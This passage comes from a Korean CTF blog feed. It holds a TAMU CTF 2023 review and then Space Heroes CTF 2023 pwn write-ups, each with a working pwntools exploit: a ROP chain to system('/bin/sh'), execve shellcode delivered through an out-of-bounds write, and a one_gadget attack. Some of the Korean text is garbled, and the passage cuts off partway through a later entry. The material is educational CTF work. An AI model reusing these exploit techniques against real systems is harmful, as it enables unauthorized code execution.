Ï≤´Î≤àÏß∏ rsa Î¨∏Ï†úÎäî ÎÅùÎÇòÍ≥† Î°∏ÏóÖÎ¥§ÎäîÎç∞ÎèÑ ÏïÑÏßÅÎèÑ Î™®Î•¥Í≤†Îã§. ÌíÄÍ≥† Ïã∂Ïñ¥ÏÑú Ïó¥Ïã¨Ìûà ÎÖ∏Î†•ÌñàÎäîÎç∞ Í≤∞Íµ≠Ïóê ÌíÄÏßÄ Î™ªÌï¥ÏÑú ÏïÑÏâΩÎã§.</p><p>Ìè¨ÎÑàÎ∏îÏùÄ Ïó≠Ïãú Î∂ÑÏÑùÎ≥¥Îã§ ÏùµÏä§Í∞Ä Ìõ®Ïî¨ Ïñ¥Î†µÎã§. ÏΩîÎìú ÏùΩÍ≥† Ï∂îÏ∏° Î™ªÌï¥ÎèÑ ÎîîÎ≤ÑÍπÖÌïòÎ©¥ÏÑú Ï∑®ÏïΩÏ†êÏùÄ ÏÉùÍ∞ÅÎ≥¥Îã§ Í∏àÎ∞© Ï∞æÏùÑ Ïàò ÏûàÎäîÎç∞ ÏùµÏä§Í∞Ä ÎÑàÎ¨¥ Ïñ¥Î†§Ïõ†Îã§. ÌäπÌûà <code>Pwnme</code>‚Ä¶ ÎêòÍ≤å Í∞ÑÎã®ÌïúÎç∞ Ïñ¥ÎñªÍ≤å ÌíÄÏßÄ Î™∞ÎùºÏÑú posixÌïúÌÖå ÎèÑÏõÄ ÏöîÏ≤≠Ìï¥ÏÑú Í∞ôÏù¥ Î≥¥Îã§Í∞Ä posixÍ∞Ä Ï≤úÏû¨Í∞ôÏùÄ Î∞úÏÉÅ(ÎÇòÎäî Î™ªÌñàÎçò Î∞úÏÉÅ)ÏúºÎ°ú ÌíÄÏñ¥Î≤ÑÎ†∏Îã§ „Ñ∑„Ñ∑. <code>Shellcode</code> Î¨∏Ï†úÎäî whitelistÍ∞Ä ÎÑàÎ¨¥ Îπ°ÏÑ∏ÏÑú andÏôÄ or Ïó∞ÏÇ∞Ï†ïÎèÑÎ∞ñÏóê ÏÇ¨Ïö©Î™ªÌïúÎã§. ÏïÑÏßÅ ÎÇ¥ Ïó≠ÎüâÏúºÎ°úÎäî ÌíÄ Ïàò ÏóÜÏùÑ Í≤É Í∞ôÏïÑÏÑú posixÌïúÌÖå ÌíÄÏñ¥Îã¨ÎùºÍ≥† ÌñàÎã§. „Öé <code>Macchiato</code> Î¨∏Ï†úÎäî ÏûêÎ∞îÎ°ú ÏûëÏÑ±ÎêòÏñ¥ ÏûàÎã§. ÏûêÎ∞îÎ°ú ÏûëÏÑ±Îêú ÌîÑÎ°úÍ∑∏Îû®ÏùÄ Î©îÎ™®Î¶¨ Í¥ÄÎ¶¨Î•º Í∞ÄÎπÑÏßÄ Ïª¨Î†âÌÑ∞Í∞Ä Ïûò Ìï¥Ï£ºÍ∏∞ ÎïåÎ¨∏Ïóê ÏùºÎ∞òÏ†ÅÏúºÎ°ú Î©îÎ™®Î¶¨ Ïª§ÎüΩÏÖò Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌï† Ïàò ÏóÜÎã§. Í∑∏ÎûòÏÑú ÏùºÎ∂ÄÎü¨ Ï∑®ÏïΩÌïú ÌÇ§ÏõåÎìúÎ•º ÏûëÏÑ±Ìï¥Ï§òÏïº ÌïúÎã§. ÏÉàÎ≤ΩÏóê Î∂ÑÏÑù Ï°∞Í∏à ÌïòÎã§Í∞Ä Ïû†ÏôÄÏÑú Í∑∏ÎßåÎíÄÎã§. </p><p>Ìè¨Î†åÏãù Ï≤´Î≤àÏß∏ Î¨∏Ï†úÎäî Î©îÎ™®Î¶¨ Ìè¨Î†åÏãù Î¨∏Ï†úÏù¥Îã§. ÎîîÏä§ÌÅ¨ Ïù¥ÎØ∏ÏßÄÎ•º Ï†úÍ≥µÌï¥Ï£ºÎäîÎç∞ mountÍπåÏßÄ ÌïòÍ≥† posixÏôÄ Í∞ôÏù¥ Î∂ÑÏÑùÌñàÎã§. Î¨∏Ï†úÏóêÏÑú Ï†úÍ≥µÌï¥Ï§Ä pcap ÌååÏùºÏóêÏÑú 4444 Ìè¨Ìä∏Ïóê Ï†ëÏÜçÌï¥ÏÑú Îç∞Ïù¥ÌÑ∞Î•º Ï£ºÍ≥† Î∞õÏùÄ Í≤ÉÏùÑ Î∞îÌÉïÏúºÎ°ú 4444 Ìè¨Ìä∏Î•º Ïó¨Îäî Î∞îÏù¥ÎÑàÎ¶¨Î•º Ï∞æÏúºÎ†§Í≥† ÌñàÎã§. vi historyÏù∏Í∞Ä Í∑∏Í±∞ Î≥¥Í≥† ÏàòÏÉÅÌïú ÌååÏù¥Ïç¨ ÏΩîÎìúÎ•º Ï∞æÏïòÎäîÎç∞ AES encodeÎ•º Ïù¥Ïö©ÌïòÏó¨ ÌÜµÏã†ÏùÑ Ìï† Ïàò ÏûàÎäî ÏΩîÎìúÏòÄÎã§. Ïó¨Í∏∞ÏÑúÎ∂ÄÌÑ∞ ÎöùÎî±ÎöùÎî± posixÍ∞Ä pcap ÌååÏùºÏóêÏÑú Îç∞Ïù¥ÌÑ∞ Ï†ÑÏÜ°ÌïúÍ±∞Îûë Ï†ÑÏÜ°Î∞õÏùÄ Í≤ÉÏùÑ Ìï¥ÏÑùÌï¥ÏÑú flagÎ•º Íµ¨Ìï† Ïàò ÏûàÏóàÎã§. ÎëêÎ≤àÏß∏ <code>Discordance</code> Î¨∏Ï†úÎäî Ïó¥Ïã¨Ìûà ÎÖ∏Î†•ÌñàÎäîÎç∞ Í≤∞Íµ≠ ÌíÄÏßÄ Î™ªÌïòÏòÄÎã§. Î°∏ÏóÖÎ¥§ÎäîÎç∞ ÎÇ¥ Í∏∞Ï§ÄÏúºÎ°ú Í≤åÏã± ÏöîÏÜåÍ∞Ä ÏûàÏñ¥ÏÑú ÌïòÎ£®Ï¢ÖÏùº Î¥§Ïñ¥ÎèÑ Î™ª ÌíÄÏóàÏùÑ Í≤É Í∞ôÎã§. </p><p>ÎØ∏Ïä§ÌÅ¨Îäî ÎÇòÎ¶Ñ Ïû¨Î∞åÏóàÎã§. ÎßàÏßÄÎßâ Î¨∏Ï†úÎäî ÎßàÏù∏ÌÅ¨ÎûòÌîÑÌä∏ÏóêÏÑú Î™ÖÎ†πÏñ¥Î•º Ïã§ÌñâÏãúÌÇ§Îäî Î¨∏Ï†úÏù∏Îç∞ ÎÑàÎ¨¥ Ïã†Î∞ïÌñàÎã§. ÎÇ¥Í∞Ä Í¥ÄÏó¨Ìïú Í≤ÉÏùÄ ÌïòÎÇòÎèÑ ÏóÜÏßÄÎßå Í∑∏ÎÉ• Ïû¨Î∞åÏóàÎã§. </p><p>ÎåÄÌöå ÏãúÏûëÌïòÍ∏∞ Ï†ÑÏóê Ïî®ÌÖù Ïö¥ÏòÅÏßÑÏùò Ïã§ÏàòÎ°ú ÎåÄÌöå ÏãúÍ∞ÑÏù¥ Ï°∞Í∏à Ïù¥ÏÉÅÌñàÏßÄÎßå, (ÏÑ∏Í≥Ñ ÏãúÍ∞ÑÏùÑ Ï†úÎåÄÎ°ú ÏàôÏßÄÌïòÏßÄ Î™ªÌïú Í≤ÉÏúºÎ°ú Î≥¥Ïù∏Îã§.) Î¨∏Ï†úÎäî Ï†ÑÎ∂Ä Îã§ ÏÉùÍ∞ÅÎ≥¥Îã§ Ïû¨Î∞åÏóàÎã§. ÎåÄÌöå Í∏∞Í∞ÑÎèÑ 48ÏãúÍ∞ÑÏù¥Îùº ÏïÑÎ¨¥Í≤ÉÎèÑ Î™®Î•¥Îäî ÌÅ¨Î¶ΩÌÜ†Î•º Í≥µÎ∂ÄÌïòÎ©¥ÏÑú ÌíÄ Ïàò ÏûàÏñ¥ÏÑú Îß§Ïö∞ ÏùòÎØ∏ÏûàÎçò ÏãúÍ∞ÑÏù¥ÏóàÎã§.</p><p>Î°∏ÏóÖÏùÄ ÌÅ¨Î¶ΩÌÜ† Îëê Î¨∏Ï†úÏôÄ Ìè¨ÎÑàÎ∏î 8 Î¨∏Ï†úÎ•º Ï†ÅÏúºÎ†§Í≥† ÌïúÎã§. Îã§ Ï†ÅÏúºÎ©¥ Ïó¨Í∏∞ ÏïÑÎûò ÎßÅÌÅ¨Î•º Ï∂îÍ∞ÄÌï† ÏòàÏ†ïÏù¥Îã§.</p><ul><li>Pwn<ul><li><a href="http://jiravvit.github.io/230503-tamu2023-1.Inspector_Gadget-pwn/">http://jiravvit.github.io/230503-tamu2023-1.Inspector_Gadget-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-2.Unlucky-pwn/">http://jiravvit.github.io/230503-tamu2023-2.Unlucky-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-3.Pointers-pwn/">http://jiravvit.github.io/230503-tamu2023-3.Pointers-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-4.Randomness-pwn/">http://jiravvit.github.io/230503-tamu2023-4.Randomness-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-5.Sea_Shells-pwn/">http://jiravvit.github.io/230503-tamu2023-5.Sea_Shells-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-6.Bank-pwn/">http://jiravvit.github.io/230503-tamu2023-6.Bank-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/">http://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-8.Pwnme-pwn/">http://jiravvit.github.io/230503-tamu2023-8.Pwnme-pwn/</a></li></ul></li><li>Crypto<ul><li><a href="http://jiravvit.github.io/230503-tamu2023-9.MD5-crypto/">http://jiravvit.github.io/230503-tamu2023-9.MD5-crypto/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-10.PRNG-crypto/">http://jiravvit.github.io/230503-tamu2023-10.PRNG-crypto/</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - engine failure (simple rop)</title>
      <link href="/230428-superheroesctf2023-engine-failure/"/>
      <url>/230428-superheroesctf2023-engine-failure/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 245 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2Î≤à ÏòµÏÖòÏùÑ ÌÜµÌï¥ <code>puts</code> Î¶ΩÏãú Ï£ºÏÜåÎ•º Ï∂úÎ†•Ìï¥Ï£ºÍ≥†, 1Î≤à ÏòµÏÖòÏùÑ ÌÜµÌï¥ <code>gets</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌï† Ïàò ÏûàÎã§. Îäò ÌïòÎçòÎåÄÎ°ú <code>ROP</code>Î•º ÌïòÎ©¥ ÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./engine_failure.bin&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;spaceheroes-engine-failure.chals.io&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;spaceheroes-engine-failure.chals.io&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./engine_failure.bin&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(libc.address + <span class="number">0x2a3e5</span>)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libc.address + <span class="number">0x29cd6</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;3ng1n3s_0ut_w3_4r3_d00med!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Cardassian Targeting System (oob, shellcode)</title>
      <link href="/230428-superheroesctf2023-Cardassian-Targeting-System/"/>
      <url>/230428-superheroesctf2023-Cardassian-Targeting-System/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 249 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> selectedOption; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> pageSize; <span class="comment">// [rsp+4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> *addr; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  __int64 <span class="built_in">array</span>[<span class="number">10</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  print_art();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  pageSize = getpagesize();</span><br><span class="line">  posix_memalign(&amp;addr, pageSize, pageSize);    <span class="comment">// pageSize = 4096 0x1000</span></span><br><span class="line">  mprotect(addr, pageSize, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;selectedOption);</span><br><span class="line">    getchar();</span><br><span class="line">    performAction(selectedOption, <span class="built_in">array</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc</code>ÏùÑ ÌÜµÌï¥ Î∞òÌôòÎêú <code>heap</code>ÏùÄ <code>mprotect</code> Ìï®ÏàòÎ°ú Ïù∏Ìï¥ Ïã§Ìñâ Í∂åÌïúÏù¥ Ï£ºÏñ¥ÏßÑ ÏòÅÏó≠Ïù¥ ÎêòÏóàÎã§. Ïó¨Í∏∞Ïóê ÏâòÏΩîÎìúÎ•º ÎÑ£Í≥† ÌùêÎ¶ÑÏùÑ Ïó¨Í∏∞Î°ú Ï†ÑÌôòÏãúÌÇ§Î©¥ Îê† Í≤É Í∞ôÎã§. </p><p><code>performAction</code> Ìï®ÏàòÏóêÏÑú ÎåÄÎÜìÍ≥† <code>oob read</code>ÏôÄ <code>oob write</code>Î•º Ï∞æÏùÑ Ïàò ÏûàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-cardassian-targeting-system.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-cardassian-targeting-system.chals.io&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./cardassian-targeting-system&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./cardassian-targeting-system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oob_read</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;coordinates: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oob_write</span>(<span class="params">idx, data</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asdf</span>(<span class="params">shellcode</span>):</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">asdf(shellcode)</span><br><span class="line"></span><br><span class="line">heap = oob_read(-<span class="number">1</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -3 : ret</span></span><br><span class="line">oob_write(-<span class="number">3</span>, heap)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;cardass1an5_ar3_m3t1culou5_r3c0rd_k33p3rs&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Cardassian Targeting System Mk.2 (oob, one_gadget)</title>
      <link href="/230428-superheroesctf2023-Cardassian-Targeting-System-Mk.2/"/>
      <url>/230428-superheroesctf2023-Cardassian-Targeting-System-Mk.2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cardassian Targeting System</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  pageSize = getpagesize();</span><br><span class="line">  posix_memalign(&amp;addr, pageSize, pageSize);    <span class="comment">// pageSize = 4096 0x1000</span></span><br><span class="line">  mprotect(addr, pageSize, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cardassian Targeting System Mk.2</span></span><br><span class="line"><span class="comment">// main</span></span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure><p><a href="https://jiravvit.github.io/230428-superheroesctf2023-Cardassian-Targeting-System/">Ïù¥Ï†Ñ Î¨∏Ï†ú</a>ÏôÄ Îã§Î•∏ Ï†êÏùÄ ÏâòÏΩîÎìúÎ•º Ïã§ÌñâÌï† Í≥µÍ∞ÑÎèÑ ÏóÜÍ≥† Í∂åÌïúÎèÑ ÏóÜÎã§Îäî Ï†êÏù¥Îã§. Ïù¥ Ïô∏Ïóê <code>oob read</code>, <code>oob write</code>Í∞Ä Î∞úÏÉùÌïúÎã§Îäî Ï†êÏùÄ ÎòëÍ∞ôÎã§. Ïö¥ Ï¢ãÍ≤åÎèÑ ÏõêÍ∞ÄÏ†ØÏùÑ Ïù¥Ïö©Ìï† Ïàò ÏûàÏñ¥ÏÑú <code>stack</code>Ïóê ÏûàÎäî <code>ret</code>Ïóê ÎÑ£Ïñ¥Ï£ºÎ©¥ ÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./challp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-cardassian-targeting-system-2.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-cardassian-targeting-system-2.chals.io&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./challp&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">20</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;coordinates:&#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment">#- 0x2384a</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x1ec6a0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">one_gadget_remote = <span class="number">0xe6c81</span></span><br><span class="line"><span class="comment"># stack_ret off = -3</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">3</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.address + one_gadget_remote))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;th3_pah-wraith5_h4ve_judged_y0u_4nd_f0und_you_w0rthy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Death Star Targeting Computer (ret2win)</title>
      <link href="/230428-superheroesctf2023-Death-Star-Targeting-Computer/"/>
      <url>/230428-superheroesctf2023-Death-Star-Targeting-Computer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 245 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 